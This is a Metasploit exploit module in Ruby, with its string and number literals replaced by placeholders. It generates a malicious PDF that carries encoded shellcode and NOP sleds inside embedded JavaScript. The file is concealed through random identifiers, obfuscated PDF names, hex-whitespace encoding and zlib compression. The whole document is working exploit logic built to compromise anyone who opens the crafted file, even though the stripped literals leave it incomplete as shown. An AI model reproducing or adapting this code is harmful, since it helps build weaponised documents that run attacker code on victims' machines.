require <str> require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GoodRanking include Msf :: Exploit :: FILEFORMAT def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <str> } ] , ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def exploit shellcode = Rex :: Text . to_unescape ( payload . encoded , Rex :: Arch . endian ( target . arch ) ) nops = Rex :: Text . to_unescape ( make_nops ( <int> ) ) rand1 = rand_text_alpha ( rand ( <int> ) + <int> ) rand2 = rand_text_alpha ( rand ( <int> ) + <int> ) rand3 = rand_text_alpha ( rand ( <int> ) + <int> ) rand4 = rand_text_alpha ( rand ( <int> ) + <int> ) rand5 = rand_text_alpha ( rand ( <int> ) + <int> ) rand6 = rand_text_alpha ( rand ( <int> ) + <int> ) rand7 = rand_text_alpha ( rand ( <int> ) + <int> ) rand8 = rand_text_alpha ( rand ( <int> ) + <int> ) rand9 = rand_text_alpha ( rand ( <int> ) + <int> ) rand10 = rand_text_alpha ( rand ( <int> ) + <int> ) rand11 = rand_text_alpha ( rand ( <int> ) + <int> ) rand12 = rand_text_alpha ( rand ( <int> ) + <int> ) script = <str> rand1 <str> shellcode <str> rand2 <str> rand3 <str> rand3 <str> rand3 <str> rand2 <str> nops <str> rand4 <str> rand2 <str> rand1 <str> rand5 <str> nops <str> rand6 <str> rand7 <str> rand6 <str> rand4 <str> rand5 <str> rand7 <str> rand5 <str> rand5 <str> rand8 <str> rand5 <str> rand7 <str> rand9 <str> rand5 <str> rand5 <str> rand7 <str> rand9 <str> rand7 <str> rand9 <str> rand9 <str> rand9 <str> rand8 <str> rand10 <str> rand11 <str> rand11 <str> rand11 <str> rand10 <str> rand11 <str> rand9 <str> rand4 <str> rand12 <str> rand12 <str> rand12 <str> rand12 <str> rand12 <str> pdf = make_pdf ( script ) print_status ( <str> datastore [ <str> ] <str> ) file_create ( pdf ) end def random_non_ascii_string ( count ) result = <str> count . times do result << ( rand ( <int> ) + <int> ) . chr end result end def io_def ( id ) <str> % id end def io_ref ( id ) <str> % id end def n_obfu ( str ) result = <str> str . scan ( <str> ) do | c | if rand ( <int> ) == <int> and c . upcase > = <str> and c . upcase < = <str> result << <str> % c . unpack ( <str> ) [ <int> ] else result << c end end result end def ascii_hex_whitespace_encode ( str ) result = <str> whitespace = <str> str . each_byte do | b | result << whitespace << <str> % b whitespace = <str> * ( rand ( <int> ) + <int> ) end result << <str> end def make_pdf ( js ) xref = [ ] eol = <str> endobj = <str> << eol pdf = <str> << eol pdf << <str> << random_non_ascii_string ( <int> ) << eol xref << pdf . length pdf << io_def ( <int> ) << n_obfu ( <str> ) << io_ref ( <int> ) << n_obfu ( <str> ) << io_ref ( <int> ) << n_obfu ( <str> ) << io_ref ( <int> ) << <str> << endobj xref << pdf . length pdf << io_def ( <int> ) << n_obfu ( <str> ) << endobj xref << pdf . length pdf << io_def ( <int> ) << n_obfu ( <str> ) << io_ref ( <int> ) << n_obfu ( <str> ) << endobj xref << pdf . length pdf << io_def ( <int> ) << n_obfu ( <str> ) << io_ref ( <int> ) << n_obfu ( <str> ) << endobj xref << pdf . length pdf << io_def ( <int> ) << n_obfu ( <str> ) + io_ref ( <int> ) + <str> << endobj xref << pdf . length compressed = Zlib :: Deflate . deflate ( ascii_hex_whitespace_encode ( js ) ) pdf << io_def ( <int> ) << n_obfu ( <str> % compressed . length ) << eol pdf << <str> << eol pdf << compressed << eol pdf << <str> << eol pdf << endobj xrefPosition = pdf . length pdf << <str> << eol pdf << <str> % ( xref . length + <int> ) << eol pdf << <str> << eol xref . each do | index | pdf << <str> % index << eol end pdf << <str> << n_obfu ( <str> % ( xref . length + <int> ) ) << io_ref ( <int> ) << <str> << eol pdf << <str> << eol pdf << xrefPosition . to_s ( ) << eol pdf << <str> << eol end end 
